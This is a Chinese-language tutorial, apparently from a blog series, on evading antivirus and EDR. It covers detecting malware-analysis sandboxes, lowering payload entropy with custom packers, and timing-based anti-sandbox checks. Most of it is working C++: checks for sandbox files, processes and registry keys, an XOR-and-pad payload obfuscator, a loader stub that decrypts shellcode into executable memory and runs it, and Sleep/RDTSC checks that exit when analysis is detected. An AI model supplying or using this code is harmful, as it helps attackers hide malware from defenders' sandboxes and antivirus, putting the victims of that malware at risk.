<h2 id="AV-EDR规避技术-7-4-自动化分析平台检测（Hybrid-Analysis、Any-Run、Cuckoo-等）"><a href="#AV-EDR规避技术-7-4-自动化分析平台检测（Hybrid-Analysis、Any-Run、Cuckoo-等）" class="headerlink" title="AV&#x2F;EDR规避技术 - 7.4 - 自动化分析平台检测（Hybrid Analysis、Any.Run、Cuckoo 等）"></a>AV&#x2F;EDR规避技术 - 7.4 - 自动化分析平台检测（Hybrid Analysis、Any.Run、Cuckoo 等）</h2><p><strong>目标：</strong><br>检测二进制文件是否在已知的恶意软件分析服务或自动化沙箱环境中执行。这些服务通常会留下独特的遗留物或行为模式，可以被检测并用来规避分析。</p>
<hr>
<h3 id="1-检测已知沙箱遗留物（文件-进程-注册表）"><a href="#1-检测已知沙箱遗留物（文件-进程-注册表）" class="headerlink" title="1. 检测已知沙箱遗留物（文件&#x2F;进程&#x2F;注册表）"></a>1. <strong>检测已知沙箱遗留物（文件&#x2F;进程&#x2F;注册表）</strong></h3><h4 id="1-1-文件路径"><a href="#1-1-文件路径" class="headerlink" title="1.1 文件路径"></a>1.1 文件路径</h4><p>沙箱有时会模拟文件系统，并可能包含已知路径。</p>
<p><strong>示例：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsRunningInSandboxFileArtifacts</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD attrib = <span class="hljs-built_in">GetFileAttributesA</span>(<span class="hljs-string">&quot;C:\\sample\\testfile.txt&quot;</span>); <span class="hljs-comment">// 已知 Cuckoo 遗留物</span><br>    <span class="hljs-keyword">if</span> (attrib != INVALID_FILE_ATTRIBUTES &amp;&amp; !(attrib &amp; FILE_ATTRIBUTE_DIRECTORY)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// HybridAnalysis 有时会创建 C:\analysis</span><br>    attrib = <span class="hljs-built_in">GetFileAttributesA</span>(<span class="hljs-string">&quot;C:\\analysis&quot;</span>);<br>    <span class="hljs-keyword">return</span> (attrib != INVALID_FILE_ATTRIBUTES &amp;&amp; (attrib &amp; FILE_ATTRIBUTE_DIRECTORY));<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="1-2-进程名称"><a href="#1-2-进程名称" class="headerlink" title="1.2 进程名称"></a>1.2 进程名称</h4><p>自动化工具通常会启动已知的父进程或兄弟进程。</p>
<p><strong>示例：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsSuspiciousProcessRunning</span><span class="hljs-params">()</span> </span>&#123;<br>    PROCESSENTRY32 pe32;<br>    pe32.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br>    HANDLE snapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32First</span>(snapshot, &amp;pe32)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-function">std::string <span class="hljs-title">proc</span><span class="hljs-params">(pe32.szExeFile)</span></span>;<br>            <span class="hljs-keyword">if</span> (proc == <span class="hljs-string">&quot;vboxservice.exe&quot;</span> || proc == <span class="hljs-string">&quot;vmsrvc.exe&quot;</span> || <br>                proc == <span class="hljs-string">&quot;sandbox.exe&quot;</span> || proc == <span class="hljs-string">&quot;sample.exe&quot;</span> || <br>                proc == <span class="hljs-string">&quot;cuckoo.exe&quot;</span>) &#123;<br>                <span class="hljs-built_in">CloseHandle</span>(snapshot);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(snapshot, &amp;pe32));<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(snapshot);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="1-3-注册表键"><a href="#1-3-注册表键" class="headerlink" title="1.3 注册表键"></a>1.3 注册表键</h4><p>一些沙箱会创建特殊的注册表键或条目来模拟安装。</p>
<p><strong>示例：</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CheckSandboxRegistry</span><span class="hljs-params">()</span> </span>&#123;<br>    HKEY hKey;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyExA</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">&quot;SOFTWARE\\Cuckoo&quot;</span>, <span class="hljs-number">0</span>, KEY_READ, &amp;hKey) == ERROR_SUCCESS) &#123;<br>        <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="2-检查网络行为和-DNS-模式"><a href="#2-检查网络行为和-DNS-模式" class="headerlink" title="2. 检查网络行为和 DNS 模式"></a>2. <strong>检查网络行为和 DNS 模式</strong></h3><p>像 Any.Run 和 HybridAnalysis 这样的平台使用已知的子域，如：</p>
<ul>
<li><p><code>*.hybrid-analysis.com</code></p>
</li>
<li><p><code>*.any.run</code></p>
</li>
<li><p>DNS 服务器地址，如 <code>192.168.56.1</code>（VirtualBox NAT）</p>
</li>
</ul>
<p>你可以发出 DNS 查询，看看是否解析失败或解析为假的本地 IP。</p>
<hr>
<h3 id="3-环境行为检查"><a href="#3-环境行为检查" class="headerlink" title="3. 环境行为检查"></a>3. <strong>环境行为检查</strong></h3><p>这些平台通常会：</p>
<ul>
<li><p>不模拟鼠标或键盘输入</p>
</li>
<li><p>在启动后立即执行样本</p>
</li>
<li><p>限制或没有用户交互</p>
</li>
</ul>
<p>你可以延迟执行并监控是否有输入。</p>
<p><strong>示例：输入检测</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">WaitForUserInteraction</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> timeout = <span class="hljs-number">10000</span>; <span class="hljs-comment">// 10 秒</span><br>    DWORD start = <span class="hljs-built_in">GetTickCount</span>();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetTickCount</span>() - start &lt; timeout) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetAsyncKeyState</span>(VK_LBUTTON) || <span class="hljs-built_in">GetAsyncKeyState</span>(VK_RETURN)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 用户存在</span><br>        &#125;<br>        <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">500</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 可能是沙箱或自动化环境</span><br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="4-基于时间的规避"><a href="#4-基于时间的规避" class="headerlink" title="4. 基于时间的规避"></a>4. <strong>基于时间的规避</strong></h3><p>一些沙箱会加速或跳过长时间的延迟。你可以对比：</p>
<ul>
<li><p><code>GetTickCount()</code> 与 <code>Sleep()</code> 时长</p>
</li>
<li><p><code>QueryPerformanceCounter</code> 偏差</p>
</li>
<li><p>RDTSC 时序</p>
</li>
</ul>
<hr>
<h3 id="5-内存和-PE-扫描检测"><a href="#5-内存和-PE-扫描检测" class="headerlink" title="5. 内存和 PE 扫描检测"></a>5. <strong>内存和 PE 扫描检测</strong></h3><p>你可以检测是否通过沙箱加载器将 PE 文件内存映射或注入，使用意外的内存区域或保护标志。</p>
<p>这更为高级，可能需要扫描进程内存区域（例如，通过 <code>VirtualQueryEx</code>）。</p>
<hr>
<h3 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h3><p>恶意软件作者在以下恶意软件中使用这些技术：</p>
<ul>
<li><p>Emotet</p>
</li>
<li><p>TrickBot</p>
</li>
<li><p>Dridex</p>
</li>
<li><p>AgentTesla</p>
</li>
</ul>
<p>这些恶意软件通过结合使用遗留物、注册表、时间、输入检测等手段来避免被像 Cuckoo、Joe Sandbox 或 Any.Run 等平台分析。</p>
<hr>
<h3 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://any.run/">Any.Run</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.hybrid-analysis.com/">Hybrid Analysis</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/cuckoosandbox">Cuckoo Sandbox</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.joesandbox.com/">Joe Sandbox</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/LordNoteworthy/al-khaser">Al-Khaser 项目</a></p>
</li>
</ul>
<h2 id="AV-EDR规避技术-7-5-熵值降低与自定义打包器"><a href="#AV-EDR规避技术-7-5-熵值降低与自定义打包器" class="headerlink" title="AV&#x2F;EDR规避技术 - 7.5 - 熵值降低与自定义打包器"></a>AV&#x2F;EDR规避技术 - 7.5 - 熵值降低与自定义打包器</h2><p><strong>目标：</strong><br>规避依赖统计分析的检测机制，特别是基于 <strong>熵值</strong> 的检测方法，旨在检测被打包或混淆的二进制文件。本模块涵盖如何 <strong>降低载荷的熵值</strong> 和 <strong>创建自定义打包器</strong>，以击败静态防病毒签名和熵值启发式检测。</p>
<hr>
<p> 背景</p>
<p>许多静态防病毒和沙箱解决方案检查 <strong>PE 文件中各个段的熵值</strong>（尤其是 <code>.text</code>、<code>.data</code>、<code>.rsrc</code>），以检测：</p>
<ul>
<li><p>打包的二进制文件（如 UPX、MPRESS、Themida）</p>
</li>
<li><p>加密或压缩的载荷</p>
</li>
<li><p>混淆的 shellcode</p>
</li>
</ul>
<p><strong>高熵（接近 7.9 位&#x2F;字节）</strong> 表示加密&#x2F;压缩。</p>
<hr>
<h3 id="1-通过-XOR-填充降低熵值"><a href="#1-通过-XOR-填充降低熵值" class="headerlink" title="1. 通过 XOR 填充降低熵值"></a>1. 通过 XOR 填充降低熵值</h3><p><strong>基本概念：</strong><br>使用已知密钥对载荷进行 XOR 加密，并用零或可识别的低熵模式进行填充。</p>
<h4 id="C-示例："><a href="#C-示例：" class="headerlink" title="C++ 示例："></a>C++ 示例：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-comment">// XOR 加密文件并写入结果，填充以降低熵</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">xor_and_pad_payload</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; input, <span class="hljs-type">const</span> std::string&amp; output, <span class="hljs-type">uint8_t</span> key)</span> </span>&#123;<br>    <span class="hljs-function">std::ifstream <span class="hljs-title">in</span><span class="hljs-params">(input, std::ios::binary)</span></span>;<br>    <span class="hljs-function">std::ofstream <span class="hljs-title">out</span><span class="hljs-params">(output, std::ios::binary)</span></span>;<br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; <span class="hljs-title">buffer</span><span class="hljs-params">((std::istreambuf_iterator&lt;<span class="hljs-type">char</span>&gt;(in)), std::istreambuf_iterator&lt;<span class="hljs-type">char</span>&gt;())</span></span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; byte : buffer) &#123;<br>        byte ^= key;  <span class="hljs-comment">// XOR 加密</span><br>    &#125;<br><br>    out.<span class="hljs-built_in">write</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(buffer.<span class="hljs-built_in">data</span>()), buffer.<span class="hljs-built_in">size</span>());<br><br>    <span class="hljs-comment">// 添加 512 字节的 0x00 填充以降低熵</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; <span class="hljs-title">pad</span><span class="hljs-params">(<span class="hljs-number">512</span>, <span class="hljs-number">0x00</span>)</span></span>;<br>    out.<span class="hljs-built_in">write</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">char</span>*&gt;(pad.<span class="hljs-built_in">data</span>()), pad.<span class="hljs-built_in">size</span>());<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 载荷已被混淆并填充以降低熵。\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">xor_and_pad_payload</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>, <span class="hljs-string">&quot;obfuscated_payload.bin&quot;</span>, <span class="hljs-number">0xAA</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>注意事项：</strong></p>
<ul>
<li><p>结果文件的熵值将低于原始的 XOR 加密版本。</p>
</li>
<li><p>用 null、空格或可打印字符填充可以减少随机性。</p>
</li>
</ul>
<hr>
<h3 id="2-自定义-PE-打包器（Stub-载荷）"><a href="#2-自定义-PE-打包器（Stub-载荷）" class="headerlink" title="2. 自定义 PE 打包器（Stub + 载荷）"></a>2. 自定义 PE 打包器（Stub + 载荷）</h3><p>与使用 UPX 不同，你可以构建自己的打包器：</p>
<ul>
<li><p><strong>阶段 1</strong>：加载器 stub 解密或解压载荷</p>
</li>
<li><p><strong>阶段 2</strong>：在内存中执行载荷（反射加载，手动映射）</p>
</li>
</ul>
<h4 id="架构："><a href="#架构：" class="headerlink" title="架构："></a>架构：</h4><ol>
<li><p>将 shellcode 或 PE 编译为二进制格式</p>
</li>
<li><p>对其进行 XOR 或压缩</p>
</li>
<li><p>创建一个 stub 加载器</p>
</li>
<li><p>将 stub 和载荷连接起来</p>
</li>
<li><p>在运行时，stub 解密&#x2F;解压并在内存中执行载荷</p>
</li>
</ol>
<hr>
<h3 id="3-加载器-Stub-–-最小示例（XOR-解码器）"><a href="#3-加载器-Stub-–-最小示例（XOR-解码器）" class="headerlink" title="3. 加载器 Stub – 最小示例（XOR 解码器）"></a>3. 加载器 Stub – 最小示例（XOR 解码器）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">// 加密的载荷包含在编译时</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> payload[];<br><span class="hljs-keyword">extern</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> payload_len;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt_payload</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">uint8_t</span> key)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i)<br>        buf[i] ^= key;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 为载荷分配内存</span><br>    <span class="hljs-type">void</span>* exec_mem = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">nullptr</span>, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec_mem, payload, payload_len);<br><br>    <span class="hljs-comment">// 就地解密</span><br>    <span class="hljs-built_in">decrypt_payload</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*&gt;(exec_mem), payload_len, <span class="hljs-number">0xAA</span>);<br><br>    <span class="hljs-comment">// 执行载荷</span><br>    ((<span class="hljs-built_in">void</span>(*)())exec_mem)();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>你可以将这个 stub 与一个二进制资源链接（例如通过 <code>xxd -i</code>）包含混淆的 shellcode。</p>
<hr>
<h3 id="4-实际恶意软件使用案例"><a href="#4-实际恶意软件使用案例" class="headerlink" title="4. 实际恶意软件使用案例"></a>4. 实际恶意软件使用案例</h3><ul>
<li><p><strong>FIN7 和 APT32</strong> 使用自定义的 stub 来降低熵值</p>
</li>
<li><p><strong>Ursnif、LokiBot</strong> 使用填充的 XOR 或 LZNT1 压缩打包载荷</p>
</li>
<li><p>像 <strong>UPX</strong> 这样的打包器容易被标记，自定义逻辑显著减少了防病毒检测。</p>
</li>
</ul>
<hr>
<h3 id="5-通过自定义打包规避检测"><a href="#5-通过自定义打包规避检测" class="headerlink" title="5. 通过自定义打包规避检测"></a>5. 通过自定义打包规避检测</h3><p><strong>标准打包器</strong> 容易被逆向分析，并且有针对其头部的签名。自定义打包器：</p>
<ul>
<li><p>绕过熵值启发式检测</p>
</li>
<li><p>避免已知的段头和元数据</p>
</li>
<li><p>规避基于模式的 YARA 规则</p>
</li>
</ul>
<p>你可以编写 Python 或 C++ 工具来生成 stubs，并将混淆后的载荷附加上标记，以便后续解析。</p>
<hr>
<h3 id="6-熵值测量工具"><a href="#6-熵值测量工具" class="headerlink" title="6. 熵值测量工具"></a>6. 熵值测量工具</h3><ul>
<li><p><code>binwalk -E</code> （Linux）</p>
</li>
<li><p><code>peframe</code> 或 <code>pefile</code> （Python）</p>
</li>
<li><p><code>Detect It Easy (DIE)</code></p>
</li>
<li><p><code>EntropyDetector.py</code> （自定义 YARA 脚本）</p>
</li>
</ul>
<hr>
<p> 额外 – 降低内存中 Shellcode 的熵值</p>
<ul>
<li><p>将 shellcode 拆分为块并逐阶段解码</p>
</li>
<li><p>使用模仿合法指令模式的解码器</p>
</li>
<li><p>将 shellcode 嵌入到像 BMP 或 ICO 这样的资源中，并使用标记（例如 <code>ImgPayload</code> 或 <code>Invoke-PSImage</code>）</p>
</li>
</ul>
<h2 id="AV-EDR规避技术-7-6-自定义延时计时器与反沙箱技巧"><a href="#AV-EDR规避技术-7-6-自定义延时计时器与反沙箱技巧" class="headerlink" title="AV&#x2F;EDR规避技术 - 7.6 - 自定义延时计时器与反沙箱技巧"></a>AV&#x2F;EDR规避技术 - 7.6 - 自定义延时计时器与反沙箱技巧</h2><p><strong>目标：</strong><br>通过引入 <strong>执行延时</strong> 和 <strong>基于时间的检查</strong> 来规避自动化沙箱和分析工具，从而检测虚拟化、仿真或受限环境。</p>
<hr>
<h3 id="延时为何重要"><a href="#延时为何重要" class="headerlink" title="延时为何重要"></a>延时为何重要</h3><p>许多沙箱：</p>
<ul>
<li><p><strong>只运行几秒钟</strong> 来记录行为</p>
</li>
<li><p><strong>跳过或加速基于时间的 API</strong>（例如 <code>Sleep</code>）</p>
</li>
<li><p><strong>使用指令仿真</strong>，而非实际硬件</p>
</li>
</ul>
<p>恶意软件作者利用这一点：</p>
<ul>
<li><p>添加长时间的 <code>Sleep()</code> 调用</p>
</li>
<li><p>检查 <strong>计时器精度</strong></p>
</li>
<li><p>测量 <strong>指令执行时间</strong></p>
</li>
<li><p>检测 <strong>加速的循环</strong></p>
</li>
</ul>
<hr>
<h3 id="1-使用-Sleep-的基本延时（单独使用效果差）"><a href="#1-使用-Sleep-的基本延时（单独使用效果差）" class="headerlink" title="1. 使用 Sleep 的基本延时（单独使用效果差）"></a>1. 使用 Sleep 的基本延时（单独使用效果差）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 睡眠 60 秒...\n&quot;</span>;<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">60000</span>);  <span class="hljs-comment">// 睡眠 60,000 毫秒（60 秒）</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 醒来了！\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>问题：</strong><br>许多沙箱会 <strong>挂钩 Sleep</strong> 并减少或跳过等待时间。因此，攻击者使用更先进的计时检查来 <strong>检测这种操作</strong>。</p>
<hr>
<h3 id="2-使用-Sleep-GetTickCount-检查计时"><a href="#2-使用-Sleep-GetTickCount-检查计时" class="headerlink" title="2. 使用 Sleep + GetTickCount 检查计时"></a>2. 使用 Sleep + GetTickCount 检查计时</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD start = <span class="hljs-built_in">GetTickCount</span>();<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">5000</span>);  <span class="hljs-comment">// 预期延时大约为 5000 毫秒</span><br>    DWORD elapsed = <span class="hljs-built_in">GetTickCount</span>() - start;<br><br>    <span class="hljs-keyword">if</span> (elapsed &lt; <span class="hljs-number">4000</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[-] 沙箱检测到：睡眠被跳过或加速。\n&quot;</span>;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 运行在真实系统中。\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>检测思路：</strong><br>如果系统跳过了时间，测量到的经过时间将过短。</p>
<hr>
<h3 id="3-使用-RDTSC-计时（CPU-时钟周期）"><a href="#3-使用-RDTSC-计时（CPU-时钟周期）" class="headerlink" title="3. 使用 RDTSC 计时（CPU 时钟周期）"></a>3. 使用 RDTSC 计时（CPU 时钟周期）</h3><p>RDTSC &#x3D; “读取时间戳计数器”，用于 <strong>周期精确的计时</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">rdtsc</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> __rdtsc();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">auto</span> start = <span class="hljs-built_in">rdtsc</span>();<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">2000</span>);<br>    <span class="hljs-keyword">auto</span> end = <span class="hljs-built_in">rdtsc</span>();<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> delta = end - start;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 睡眠期间的 TSC 时钟周期数： &quot;</span> &lt;&lt; delta &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (delta &lt; <span class="hljs-number">1000000000</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[-] 沙箱可能被检测到（低 TSC 差值）。\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 可能是一个真实的环境。\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

